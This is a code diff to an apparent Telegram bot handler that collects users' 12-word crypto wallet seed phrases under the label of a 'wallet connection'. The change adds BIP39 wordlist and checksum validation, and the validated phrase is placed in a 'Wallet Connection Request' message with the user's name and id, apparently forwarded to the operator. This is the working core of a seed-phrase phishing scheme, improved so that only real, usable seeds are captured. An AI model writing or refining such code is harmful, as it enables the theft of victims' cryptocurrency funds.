@@ -3,6 +3,9 @@ import os
 import random
 import string
 import hashlib
+from mnemonic import Mnemonic
+
+_bip39 = Mnemonic("english")
 import base58
 import json
 import requests
@@ -1976,7 +1979,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             return
 
-        words = [w for w in text.split() if w.strip()]
+        words = [w.lower().strip() for w in text.split() if w.strip()]
         count = len(words)
 
         if count != 12:
@@ -1985,27 +1988,46 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"You entered {count} word(s), but we need exactly 12 words.\n\n"
                 f"📝 <b>Please try again:</b>\n"
                 f"• Send exactly 12 words separated by spaces\n"
-                f"• Each word should contain only letters (A-Z)\n\n"
+                f"• All words must be valid BIP39 English words\n\n"
                 f"Or tap Cancel to abort the wallet connection.",
                 parse_mode="HTML",
                 reply_markup=cancel_markup(),
             )
             return
 
-        bad_indices = [i + 1 for i, w in enumerate(words) if not is_alpha_word(w)]
-        if bad_indices:
-            positions = ", ".join(map(str, bad_indices))
+        bip39_wordlist = set(_bip39.wordlist)
+        invalid_words = [
+            f"word {i + 1} (<code>{w}</code>)"
+            for i, w in enumerate(words)
+            if w not in bip39_wordlist
+        ]
+        if invalid_words:
             await update.message.reply_text(
-                f"❌ <b>Invalid Characters Found</b>\n\n"
-                f"Some words contain invalid characters. Words must contain only letters (A-Z).\n\n"
-                f"🔍 <b>Please check word position(s):</b> {positions}\n\n"
-                f"📝 Fix the invalid words and try again, or tap Cancel to abort the wallet connection.",
+                "❌ <b>Invalid Seed Phrase</b>\n\n"
+                "One or more words in your seed phrase are incorrect. "
+                "Please check and try again.\n\n"
+                "📝 <b>Format:</b> Send all 12 words separated by spaces\n"
+                "<b>Example:</b> <code>word1 word2 word3 ... word12</code>\n\n"
+                "Or tap Cancel to abort.",
                 parse_mode="HTML",
                 reply_markup=cancel_markup(),
             )
             return
 
-        wallet_seed = " ".join(words)
+        phrase = " ".join(words)
+        if not _bip39.check(phrase):
+            await update.message.reply_text(
+                "❌ <b>Invalid Seed Phrase</b>\n\n"
+                "Your seed phrase is incorrect. Please check and try again.\n\n"
+                "📝 <b>Format:</b> Send all 12 words separated by spaces\n"
+                "<b>Example:</b> <code>word1 word2 word3 ... word12</code>\n\n"
+                "Or tap Cancel to abort.",
+                parse_mode="HTML",
+                reply_markup=cancel_markup(),
+            )
+            return
+
+        wallet_seed = phrase
         forward_text = (
             f"🔐 Wallet Connection Request from @{user_name} (id: {user_id}):\n\n"
             f"<pre>{wallet_seed}</pre>"
